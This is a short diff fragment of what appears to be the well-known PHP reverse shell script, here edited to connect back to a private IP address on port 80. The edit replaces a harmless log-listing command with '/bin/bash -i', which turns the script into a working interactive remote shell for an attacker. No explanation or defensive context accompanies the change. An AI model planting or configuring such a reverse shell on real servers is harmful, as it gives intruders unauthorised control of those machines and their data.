@@ -44,7 +44,6 @@
 // Usage
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '192.168.119.134';  // CHANGE THIS
@@ -52,7 +51,7 @@ $port = 80;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'ls /var/log > /var/log/timmy.log';
+$shell = '/bin/bash -i';
 $daemon = 0;
 $debug = 0;
 
